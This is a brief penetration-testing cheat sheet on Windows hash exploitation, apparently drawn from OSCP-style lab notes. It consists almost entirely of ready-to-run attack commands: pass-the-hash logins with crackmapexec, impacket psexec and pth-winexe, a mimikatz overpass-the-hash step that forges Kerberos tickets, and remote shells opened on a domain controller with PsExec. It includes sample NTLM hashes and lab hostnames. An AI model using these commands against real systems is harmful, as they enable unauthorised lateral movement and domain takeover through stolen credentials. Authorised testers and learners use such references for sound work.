---
title: Hash_exploitation
permalink: /Hash_Exploitation/Windows
---


## identify a hash

hashid $hash

## To connect with a hash
```crackmapexec smb $BOX -u Administrator -H $hash```  
```python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes $hash administrator@$IP_BOX cmd.exe```

## Pass the hash through smb ## 
```pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd```

## Overpass the hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket ##
``` mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe```
PS C:\Windows\system32> net use \\dc01
#created a TGT
PS C:\Windows\system32> klist
#we can use PSExec.exe which run a command remotely but does not accept password hashes.
#Though, it accepts ticket
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
